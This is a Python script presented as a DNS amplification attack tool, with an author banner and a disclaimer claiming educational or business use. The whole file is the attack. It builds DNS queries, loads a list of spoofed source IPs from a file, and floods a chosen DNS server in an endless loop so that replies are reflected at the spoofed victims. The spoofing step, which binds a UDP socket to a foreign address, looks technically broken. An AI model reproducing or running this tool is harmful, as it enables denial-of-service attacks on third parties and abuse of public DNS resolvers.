################################################################################
##                                                                            ##                                         
##        This is a DNS Amplification Attack python tool                      ##
##                                                                            ##       
##        Author: MahmutAYy  < mahmutayy@yahoo.com >                          ##           
##                                                                            ##       
##    This is only educational purpose  or bussiness usage                    ##    
##  !!  Do not attempt to violate the laws with anything contained here. !!!  ##       
##                                                                            ##                                                               
################################################################################

import random
import struct
import socket
import argparse
import time

def build_dns_query(domain):
    # DNS query header
    header = struct.pack('!HHHHHH', random.randint(0, 65535), 0x0100, 1, 0, 0, 0)
    # DNS query question
    query = b''.join([struct.pack('B', len(x)) + x.encode() for x in domain.split('.')]) + b'\x00'
    question = query + struct.pack('!HH', 1, 1)
    return header + question

def dns_amp_attack(dns_server_ip, domain, interval, spoofed_ips):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    query = build_dns_query(domain)

    while True:
        for spoofed_ip in spoofed_ips:
            try:
                # Create a new socket for each spoofed IP to change the source IP address
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
                sock.bind((spoofed_ip, 0))

                sock.sendto(query, (dns_server_ip, 53))
                print(f"Sent DNS query to {dns_server_ip} spoofed as {spoofed_ip}")
                time.sleep(interval)
            except KeyboardInterrupt:
                print("Attack stopped.")
                break
            except Exception as e:
                print(f"Error: {e}")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='DNS Amplification Attack Tool By Mahmut AY')
    parser.add_argument('dns_server_ip', type=str, help='IP address of the DNS server')
    parser.add_argument('domain', type=str, help='Domain to query')
    parser.add_argument('--interval', type=float, default=1.0, help='Interval Between each request in seconds')
    parser.add_argument('--spoofed_ips_file', type=str, default='spoofedIP.txt', help='File containing spoofed IPs, please give one per line')

    args = parser.parse_args()

    try:
        with open(args.spoofed_ips_file, 'r') as f:
            spoofed_ips = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"File {args.spoofed_ips_file} not found.")
        exit(1)

    dns_amp_attack(args.dns_server_ip, args.domain, args.interval, spoofed_ips)
